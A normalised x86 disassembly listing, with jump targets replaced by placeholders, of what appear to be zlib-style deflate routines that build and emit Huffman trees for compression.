sub edi [ esp + 0x10 ]
mov ebp [ esp + 0xc ]
mov edi [ ebp + edi * 4 ]
mov [ esp + 0x18 ] edi
mov edx eax
mov eax [ esp ]
test edx edx
lea ecx [ eax + edx * 2 + 0xb38 ]
mov [ esp + 0x24 ] ecx
je r-xdata
mov edx [ esp + 0x8 ]
movzx edx [ edx + ebx * 4 + 0x2 ]
add edx [ esp + 0x18 ]
movzx ebx [ esp + 0x1c ]
imul edx ebx
mov ebx [ esp ]
add [ ebx + 0x16a8 ] edx
mov eax [ esp + 0x24 ]
movzx ebx [ eax ]
dec edx
add [ esp + 0x24 ] 0xfffffffe
test edx edx
jne r-xdata
dec [ esp + 0x14 ]
add eax 0xfffffffc
mov ecx [ eax ]
cmp ecx [ esp + 0x4 ]
jg r-xdata
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
lea eax [ eax + ecx * 4 + 0xb58 ]
test ebx ebx
je r-xdata
movzx edi [ esi + ecx * 4 + 0x2 ]
cmp edi edx
je r-xdata
dec ebx
test ebx ebx
jne r-xdata
movzx edi [ esi + ecx * 4 + 0x2 ]
mov ebp edx
sub ebp edi
movzx edi [ esi + ecx * 4 ]
imul ebp edi
mov edi [ esp ]
add [ edi + 0x16a4 ] ebp
mov [ esi + ecx * 4 + 0x2 ] dx
sub_46b600
push ebx
push esi
push edi
add esp 0xffffffd8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
xor esi esi
mov ecx 0x1
lea ebx [ esp + 0xa ]
mov edx [ esp + 0x4 ]
mov di [ edx ]
add di si
add edi edi
mov esi edi
mov [ ebx ] di
inc ecx
add ebx 0x2
add edx 0x2
cmp ecx 0xf
jle r-xdata
xor edi edi
lea ebx [ eax + 0x2 ]
cmp edi [ esp ]
jg r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
movzx esi [ ebx ]
test esi esi
je r-xdata
inc edi
add ebx 0x4
cmp edi [ esp ]
jle r-xdata
mov ax [ esp + esi * 2 + 0x8 ]
inc [ esp + esi * 2 + 0x8 ]
movzx eax ax
mov edx esi
call sub_46cedc
mov [ ebx - 0x2 ] ax
sub_46b670
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
xor esi esi
mov [ esp ] edx
mov eax [ esp ]
mov ebp [ eax ]
mov eax [ esp ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ esp + 0x4 ] edx
lea edx [ ebx + 0x1454 ]
mov ecx [ eax + 0xc ]
xor eax eax
mov [ esp + 0x8 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov [ ebx + 0x144c ] eax
mov eax ebp
mov [ ebx + 0x1450 ] 0x23d
cmp esi [ esp + 0x8 ]
jge r-xdata
cmp [ ebx + 0x144c ] 0x2
jl r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0x2
jge r-xdata
mov ecx [ esp ]
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
mov esi [ ebx + 0x144c ]
sar esi 0x1
jns r-xdata
mov [ eax + 0x2 ] 0x0
mov [ esp + 0xc ] esi
inc [ ebx + 0x144c ]
mov ecx [ ebx + 0x144c ]
mov [ ebx + ecx * 4 + 0xb58 ] esi
mov [ edx ] 0x0
jmp r-xdata
xor eax eax
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
jmp r-xdata
cmp esi 0x1
jl r-xdata
adc esi 0x0
jmp r-xdata
inc esi
inc edx
add eax 0x4
cmp esi [ esp + 0x8 ]
jl r-xdata
mov eax [ esp + 0x4 ]
movzx edx [ eax + edi * 4 + 0x2 ]
sub [ ebx + 0x16a8 ] edx
inc [ ebx + 0x144c ]
mov edi eax
mov edx [ ebx + 0x144c ]
mov [ ebx + edx * 4 + 0xb58 ] eax
mov [ ebp + edi * 4 ] 0x1
mov [ ebx + edi + 0x1454 ] 0x0
dec [ ebx + 0x16a4 ]
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov edi [ esp + 0x8 ]
mov ecx esi
mov edx ebp
mov eax ebx
call sub_46b30c
dec esi
cmp esi 0x1
jge r-xdata
mov cl [ ebx + eax + 0x1454 ]
mov cl [ ebx + esi + 0x1454 ]
jmp r-xdata
mov eax [ ebx + 0x144c ]
mov esi [ ebx + 0xb5c ]
add [ ebx + 0x144c ] 0xffffffff
mov edx [ ebx + eax * 4 + 0xb58 ]
mov eax ebx
mov [ ebx + 0xb5c ] edx
mov edx ebp
mov ecx 0x1
call sub_46b30c
mov eax [ ebx + 0xb5c ]
dec [ ebx + 0x1450 ]
mov edx [ ebx + 0x1450 ]
mov [ ebx + edx * 4 + 0xb58 ] esi
dec [ ebx + 0x1450 ]
mov ecx [ ebx + 0x1450 ]
mov [ ebx + ecx * 4 + 0xb58 ] eax
mov dx [ ebp + eax * 4 ]
add dx [ ebp + esi * 4 ]
push edx
pop ecx
mov [ ebp + edi * 4 ] cx
mov dl [ ebx + eax + 0x1454 ]
cmp dl [ ebx + esi + 0x1454 ]
ja r-xdata
dec [ ebx + 0x1450 ]
mov eax [ ebx + 0x1450 ]
mov edx [ ebx + 0xb5c ]
mov [ ebx + eax * 4 + 0xb58 ] edx
mov eax ebx
mov edx [ esp ]
call sub_46b400
lea ecx [ ebx + 0xb38 ]
mov edx [ esp + 0xc ]
mov eax ebp
call sub_46b600
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc ecx
mov edx ebp
mov [ ebx + edi + 0x1454 ] cl
mov ecx 0x1
mov [ ebp + eax * 4 + 0x2 ] di
mov eax ebx
mov [ ebp + esi * 4 + 0x2 ] di
mov [ ebx + 0xb5c ] edi
inc edi
call sub_46b30c
cmp [ ebx + 0x144c ] 0x2
jge r-xdata
sub_46b880
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov [ esp + 0xc ] 0xffffffff
movzx ebx [ edx + 0x2 ]
xor esi esi
mov ecx 0x7
mov eax 0x4
test ebx ebx
jne r-xdata
mov edi [ esp + 0x4 ]
mov [ edx + edi * 4 + 0x6 ] 0xffff
xor edi edi
add edx 0x6
mov [ esp + 0x8 ] edi
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x4 ]
jg r-xdata
mov ecx 0x8a
mov eax 0x3
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov ebx [ esp + 0x10 ]
inc esi
movzx ebx [ ebx ]
cmp ecx esi
jle r-xdata
cmp eax esi
jle r-xdata
cmp ebx edx
jne r-xdata
test edx edx
je r-xdata
mov eax [ esp ]
add [ eax + edx * 4 + 0xa78 ] si
jmp r-xdata
jmp r-xdata
cmp esi 0xa
jg r-xdata
cmp edx [ esp + 0xc ]
je r-xdata
xor esi esi
mov [ esp + 0xc ] edx
test ebx ebx
jne r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x10 ] 0x4
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x4 ]
jle r-xdata
mov eax [ esp ]
inc [ eax + 0xac0 ]
mov ecx [ esp ]
inc [ ecx + 0xabc ]
jmp r-xdata
mov eax [ esp ]
inc [ eax + 0xab8 ]
jmp r-xdata
mov ecx [ esp ]
inc [ ecx + edx * 4 + 0xa78 ]
cmp ebx edx
jne r-xdata
mov ecx 0x8a
mov eax 0x3
jmp r-xdata
mov ecx 0x7
mov eax 0x4
mov ecx 0x6
mov eax 0x3
jmp r-xdata
sub_46b98c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
xor ebx ebx
mov edi 0x4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ecx 0x7
mov [ esp + 0xc ] 0xffffffff
mov edx [ esp ]
movzx esi [ edx + 0x2 ]
test esi esi
jne r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov edx [ esp ]
add edx 0x6
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x4 ]
jg r-xdata
mov ecx 0x8a
mov edi 0x3
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov esi [ esp + 0x24 ]
inc ebx
movzx esi [ esi ]
cmp ecx ebx
jle r-xdata
cmp edi ebx
jle r-xdata
cmp esi edx
jne r-xdata
test edx edx
je r-xdata
movzx edi [ eax + edx * 4 + 0xa7a ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
jmp r-xdata
cmp ebx 0xa
jg r-xdata
cmp edx [ esp + 0xc ]
je r-xdata
mov bp [ eax + edx * 4 + 0xa78 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
add [ eax + 0x16b8 ] edi
movzx ecx [ eax + edx * 4 + 0xa78 ]
mov [ esp + 0x10 ] ecx
mov bp [ esp + 0x10 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebp [ esp + 0x10 ]
sar ebp cl
mov [ eax + 0x16b4 ] bp
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x24 ] 0x4
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x4 ]
jle r-xdata
movzx edi [ eax + 0xac2 ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
movzx edi [ eax + 0xabe ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
movzx edi [ eax + 0xaba ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
movzx edi [ eax + edx * 4 + 0xa7a ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
jmp r-xdata
dec ebx
jne r-xdata
mov bp [ eax + 0xac0 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
add [ eax + 0x16b8 ] edi
movzx ecx [ eax + 0xac0 ]
mov [ esp + 0x20 ] ecx
mov bp [ esp + 0x20 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebp [ esp + 0x20 ]
sar ebp cl
mov [ eax + 0x16b4 ] bp
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
mov bp [ eax + 0xabc ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
add [ eax + 0x16b8 ] edi
movzx ecx [ eax + 0xabc ]
mov [ esp + 0x1c ] ecx
mov bp [ esp + 0x1c ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebp [ esp + 0x1c ]
sar ebp cl
mov [ eax + 0x16b4 ] bp
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
mov bp [ eax + 0xab8 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
add [ eax + 0x16b8 ] edi
movzx ecx [ eax + 0xab8 ]
mov [ esp + 0x18 ] ecx
mov bp [ esp + 0x18 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebp [ esp + 0x18 ]
sar ebp cl
mov [ eax + 0x16b4 ] bp
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
mov bp [ eax + edx * 4 + 0xa78 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
add [ eax + 0x16b8 ] edi
movzx ecx [ eax + edx * 4 + 0xa78 ]
mov [ esp + 0x14 ] ecx
mov bp [ esp + 0x14 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebp [ esp + 0x14 ]
sar ebp cl
mov [ eax + 0x16b4 ] bp
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
xor ebx ebx
mov [ esp + 0xc ] edx
test esi esi
jne r-xdata
add bx 0xfff5
mov ecx [ eax + 0x16b8 ]
shl bx cl
or [ eax + 0x16b4 ] bx
add [ eax + 0x16b8 ] edi
add ebx 0xfffffff5
mov ecx [ eax + 0x16b8 ]
mov ebp ebx
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebx bx
sar ebx cl
mov [ eax + 0x16b4 ] bx
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
mov edi 0x7
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
add bx 0xfffd
mov ecx [ eax + 0x16b8 ]
shl bx cl
or [ eax + 0x16b4 ] bx
add [ eax + 0x16b8 ] edi
jmp r-xdata
add ebx 0xfffffffd
mov ecx [ eax + 0x16b8 ]
mov ebp ebx
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebx bx
sar ebx cl
mov [ eax + 0x16b4 ] bx
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
mov edi 0x3
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
add bx 0xfffd
mov ecx [ eax + 0x16b8 ]
shl bx cl
or [ eax + 0x16b4 ] bx
add [ eax + 0x16b8 ] edi
jmp r-xdata
add ebx 0xfffffffd
mov ecx [ eax + 0x16b8 ]
mov ebp ebx
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebx bx
sar ebx cl
mov [ eax + 0x16b4 ] bx
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
mov edi 0x2
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
dec ebx
cmp esi edx
jne r-xdata
mov ecx 0x8a
mov edi 0x3
jmp r-xdata
mov ecx 0x7
mov edi 0x4
mov ecx 0x6
mov edi 0x3
jmp r-xdata
sub_46c014
push ebx
mov ebx eax
lea edx [ ebx + 0x90 ]
mov ecx [ ebx + 0xb18 ]
mov eax ebx
call sub_46b880
lea edx [ ebx + 0x984 ]
mov ecx [ ebx + 0xb24 ]
mov eax ebx
call sub_46b880
lea edx [ ebx + 0xb2c ]
mov eax ebx
call sub_46b670
mov eax 0x12
mov edx rw-data
lea edx [ eax + eax * 2 ]
add edx 0x11
add [ ebx + 0x16a4 ] edx
pop ebx
retn
dec eax
dec edx
cmp eax 0x3
jge r-xdata
xor ecx ecx
mov cl [ edx ]
cmp [ ebx + ecx * 4 + 0xa7a ] 0x0
jne r-xdata
sub_46c078
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax 0x5
mov edx 0x10
sub edx eax
mov esi [ ebx + 0x16b8 ]
cmp edx esi
jge r-xdata
mov dx [ ebp - 0x4 ]
mov ecx [ ebx + 0x16b8 ]
add dx 0xfeff
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
mov edx [ ebp - 0x4 ]
add edx 0xfffffeff
mov ecx esi
mov esi edx
shl si cl
or [ ebx + 0x16b4 ] si
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop esi
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx dx
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
mov dx [ ebp - 0x8 ]
mov ecx [ ebx + 0x16b8 ]
add dx 0xffff
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
mov edx [ ebp - 0x8 ]
dec edx
mov ecx esi
mov esi edx
shl si cl
or [ ebx + 0x16b4 ] si
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop esi
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx dx
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
mov eax 0x5
mov edx 0x10
sub edx eax
mov esi [ ebx + 0x16b8 ]
cmp edx esi
jge r-xdata
mov dx [ ebp + 0x8 ]
mov ecx [ ebx + 0x16b8 ]
add dx 0xfffc
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx esi
mov esi edx
shl si cl
or [ ebx + 0x16b4 ] si
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop esi
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx dx
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
mov eax 0x4
mov edx 0x10
sub edx eax
mov esi [ ebx + 0x16b8 ]
cmp edx esi
jge r-xdata
mov ecx [ ebp - 0x4 ]
dec ecx
lea edx [ ebx + 0x90 ]
mov eax ebx
call sub_46b98c
mov ecx [ ebp - 0x8 ]
dec ecx
lea edx [ ebx + 0x984 ]
mov eax ebx
call sub_46b98c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi 0x3
mov ecx 0x10
sub ecx esi
cmp ecx [ ebx + 0x16b8 ]
jge r-xdata
xor edx edx
mov eax rw-data
cmp edx [ ebp + 0x8 ]
jge r-xdata
movzx edi [ eax ]
mov ecx [ ebx + 0x16b8 ]
mov di [ ebx + edi * 4 + 0xa7a ]
shl di cl
or [ ebx + 0x16b4 ] di
add [ ebx + 0x16b8 ] esi
xor ecx ecx
mov cl [ eax ]
movzx ecx [ ebx + ecx * 4 + 0xa7a ]
mov [ ebp - 0xc ] ecx
mov di [ ebp - 0xc ]
mov ecx [ ebx + 0x16b8 ]
shl di cl
or [ ebx + 0x16b4 ] di
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
pop edi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ edi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop edi
mov [ edi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edi [ ebp - 0xc ]
sar edi cl
mov [ ebx + 0x16b4 ] di
sub esi 0x10
add esi [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] esi
jmp r-xdata
inc edx
inc eax
cmp edx [ ebp + 0x8 ]
jl r-xdata
sub_46c370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebp + 0x8 ]
mov ebx 0x3
mov ecx 0x10
sub ecx ebx
mov edx [ eax + 0x16b8 ]
cmp ecx edx
jge r-xdata
mov ecx [ eax + 0x16b8 ]
shl si cl
or [ eax + 0x16b4 ] si
add [ eax + 0x16b8 ] ebx
mov ecx edx
mov edx esi
shl dx cl
or [ eax + 0x16b4 ] dx
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
lea edx [ ecx + edx ]
push edx
pop edx
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ edx ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edx [ eax + 0x8 ]
lea ecx [ edx + ecx ]
push ecx
movzx edx [ eax + 0x16b4 ]
sar edx 0x8
pop ecx
mov [ ecx ] dl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx edx si
sar edx cl
mov [ eax + 0x16b4 ] dx
sub ebx 0x10
add ebx [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] ebx
jmp r-xdata
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_46cfd4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_46c42c
push ebx
push esi
push edi
mov ebx eax
mov eax 0x3
mov edx 0x10
sub edx eax
mov esi [ ebx + 0x16b8 ]
cmp edx esi
jge r-xdata
mov dx 0x2
mov ecx [ ebx + 0x16b8 ]
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
mov edx 0x2
mov ecx esi
mov edi edx
mov esi edi
shl si cl
or [ ebx + 0x16b4 ] si
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop esi
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx di
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
mov ecx [ ebx + 0x16b8 ]
mov edx rw-data
mov dx [ edx ]
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
mov edx rw-data
movzx edx [ edx ]
mov ecx esi
mov edi edx
mov esi edi
shl si cl
or [ ebx + 0x16b4 ] si
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop esi
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx di
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
mov eax rw-data
mov edx 0x10
mov esi [ ebx + 0x16b8 ]
movzx eax [ eax ]
sub edx eax
cmp edx esi
jge r-xdata
mov [ ebx + 0x16b0 ] 0x7
pop edi
pop esi
pop ebx
retn
mov eax 0x3
mov ecx 0x10
sub ecx eax
cmp edx ecx
jle r-xdata
mov eax ebx
call sub_46cef8
mov ecx [ ebx + 0x16b0 ]
add ecx 0xb
mov edx [ ebx + 0x16b8 ]
sub ecx edx
cmp ecx 0x9
jge r-xdata
mov dx 0x2
mov ecx [ ebx + 0x16b8 ]
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
mov esi 0x2
mov ecx edx
mov edi esi
mov edx edi
shl dx cl
or [ ebx + 0x16b4 ] dx
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
lea ecx [ edx + ecx ]
push ecx
mov dl [ ebx + 0x16b4 ]
pop ecx
and dl 0xff
mov [ ecx ] dl
mov edx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov ecx [ ebx + 0x8 ]
lea edx [ ecx + edx ]
push edx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop edx
mov [ edx ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx di
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
mov ecx [ ebx + 0x16b8 ]
mov edx rw-data
mov dx [ edx ]
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
mov edx rw-data
movzx edx [ edx ]
mov ecx esi
mov edi edx
